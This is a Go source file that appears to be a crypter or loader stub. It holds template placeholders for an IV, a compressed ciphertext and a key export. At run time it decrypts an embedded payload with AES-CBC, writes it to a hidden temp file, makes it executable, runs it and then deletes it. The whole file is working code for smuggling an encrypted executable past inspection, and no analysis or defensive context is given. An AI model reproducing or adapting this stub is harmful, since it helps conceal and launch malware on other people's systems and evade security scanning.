package main

import (
	"bytes"
    "compress/flate"
    "fmt"
    "io"
    "log"
    "os"
    "os/exec"
    "strconv"
    "strings"

    "github.com/Grant-Eckstein/everglade"
)

func decompressFlate(data []byte) ([]byte, error) {
	dc := flate.NewReader(bytes.NewReader(data))
	defer dc.Close()
	rb, err := io.ReadAll(dc)
	if err != nil {
		if err != io.EOF {
			return nil, err
		}
	}
	return rb, nil
}

func recvByteSlice(bs string) []byte {
	var bb []byte
	for _, ps := range strings.Split(strings.Trim(bs, "[]"), " ") {
		pi, _ := strconv.Atoi(ps)
		bb = append(bb, byte(pi))
	}
	return bb
}

func main() {

	// Read in iv
	ivStr := fmt.Sprintf("INSERT_IV")
	iv := recvByteSlice(ivStr)

	// Read in iv
	compressedCTStr := fmt.Sprintf("INSERT_CT")
	compressedCT := recvByteSlice(compressedCTStr)
	ct, _ := decompressFlate(compressedCT)

	// Read in everglade export
	exStr := fmt.Sprintf("INSERT_EXP")
	exp := recvByteSlice(exStr)

	obj := everglade.Import(exp)

	data := obj.DecryptCBC(iv, ct)

	// Create temp file
	file, err := os.CreateTemp(".", ".*")
	if err != nil {
		log.Fatal(err)
	}
	defer os.Remove(file.Name())

	// Write to file
	err = os.WriteFile(file.Name(), data, 0777)
	if err != nil {
		log.Fatal(err)
	}

	err = os.Chmod(file.Name(), 0777)
	if err != nil {
		log.Fatal(err)
	}

	err = exec.Command(file.Name()).Run()

	if err != nil {
		log.Fatal(err)
	}
}
